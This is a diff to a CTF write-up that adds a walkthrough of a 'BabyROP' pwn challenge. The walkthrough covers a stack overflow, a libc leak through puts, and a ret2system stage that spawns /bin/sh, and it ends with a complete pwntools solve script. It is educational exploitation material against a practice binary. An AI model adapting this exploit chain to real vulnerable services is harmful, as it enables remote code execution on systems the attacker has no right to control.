@@ -64,7 +64,7 @@ Enter 1.1 billion
 
 Fake flag because the remote server is not active anymore, so I just ran this locally.
 
-## Pwn/Flag-service
+## :drop_of_blood: Pwn/Flag-service
 
 ![image](https://github.com/user-attachments/assets/f717f137-9dee-48e0-929d-40b98517fa8a)
 
@@ -248,4 +248,137 @@ p.interactive()
 
 ![image](https://github.com/user-attachments/assets/93cbac59-c515-4e0d-99f8-18d7dc772f94)
 
-## Pwn/BabyROP
+## :drop_of_blood: Pwn/BabyROP
+
+![image](https://github.com/user-attachments/assets/0a8006ec-9719-4f98-ab92-dcd8055affbf)
+
+Classic BOF challenge with no win function, and only puts() imported into the binary.
+
+![image](https://github.com/user-attachments/assets/4ddff79b-4cb4-49c3-91e0-b8f10dfe90a6)
+
+A pop rdi gadget also conveniently placed for us. Our exploit will be split into 2 stages. First we must leak libc, then we should execute a ret2system.
+
+### Stage 1 payload
+
+```py
+offset = 24
+pop_rdi = 0x0000000000401283# : pop rdi ; ret
+
+payload = b"a" * offset
+payload += p64(pop_rdi)
+payload += p64(exe.got["puts"])
+payload += p64(exe.plt["puts"])
+payload += p64(exe.sym.main)
+```
+
+We will overwrite the return address to call puts() and use the GOT address of puts as the argument, then we will loop back to main to trigger BOF again and run our 2nd stage.
+
+![image](https://github.com/user-attachments/assets/d58b7404-de82-418d-8ed0-0e6f006216b9)
+
+We have successfully leaked the libc address `\xa0\xc5s\x8d\x88\x7f`
+
+```py
+leak = u64(rl().strip().ljust(8, b"\x00"))
+print("leak @ ", hex(leak))
+libc.address = leak - libc.sym["puts"]
+li(f"libc @ {hex(libc.address)}")
+```
+
+We can calculate the base of libc with this.
+
+```py
+system = libc.sym["system"]
+binsh = next(libc.search(b"/bin/sh\x00"))
+```
+
+Now, we can search for the address of system() and the string "/bin/sh"
+
+```py
+payload = b"a" * offset
+payload += p64(pop_rdi+1)
+payload += p64(pop_rdi)
+payload += p64(binsh)
+payload += p64(system)
+```
+
+Finally, we can craft our payload to give us RCE.
+
+<details>
+<summary>Solve Script</summary>
+
+```py
+#!/usr/bin/python
+from pwn import *
+import warnings
+import time
+
+warnings.filterwarnings("ignore",category=BytesWarning)
+
+exe = context.binary = ELF('./babyROP_patched')
+libc = ELF('./libc.so.6')
+
+host = "baby-rop.warzone-challenges.com"
+port = 1343
+
+gdb_script = '''
+
+'''
+
+r = lambda x: p.recv(x)
+rl = lambda: p.recvline(keepends=False)
+ru = lambda x: p.recvuntil(x, drop=True)
+cl = lambda: p.clean(timeout=1)
+s = lambda x: p.send(x)
+sa = lambda x, y: p.sendafter(x, y)
+sl = lambda x: p.sendline(x)
+sla = lambda x, y: p.sendlineafter(x, y)
+ia = lambda: p.interactive()
+li = lambda s: log.info(s)
+ls = lambda s: log.success(s)
+
+def debug():
+  gdb.attach(p)
+  p.interactive()
+
+p = exe.process()
+# p = remote(host,port)
+#p = gdb.debug('./', gdbscript = gdb_script)
+
+offset = 24
+pop_rdi = 0x0000000000401283# : pop rdi ; ret
+
+payload = b"a" * offset
+payload += p64(pop_rdi)
+payload += p64(exe.got["puts"])
+payload += p64(exe.plt["puts"])
+payload += p64(exe.sym.main)
+
+sl(payload)
+
+rl()
+rl()
+rl()
+leak = u64(rl().strip().ljust(8, b"\x00"))
+print("leak @ ", hex(leak))
+libc.address = leak - libc.sym["puts"]
+li(f"libc @ {hex(libc.address)}")
+
+system = libc.sym["system"]
+binsh = next(libc.search(b"/bin/sh\x00"))
+li(f"libc @ {hex(system)}")
+li(f"libc @ {hex(binsh)}")
+
+payload = b"a" * offset
+payload += p64(pop_rdi+1)
+payload += p64(pop_rdi)
+payload += p64(binsh)
+payload += p64(system)
+
+sl(payload)
+
+p.interactive()
+```
+
+</details>
+
+![image](https://github.com/user-attachments/assets/ac124e0b-c206-4a4a-b782-4783f527e287)
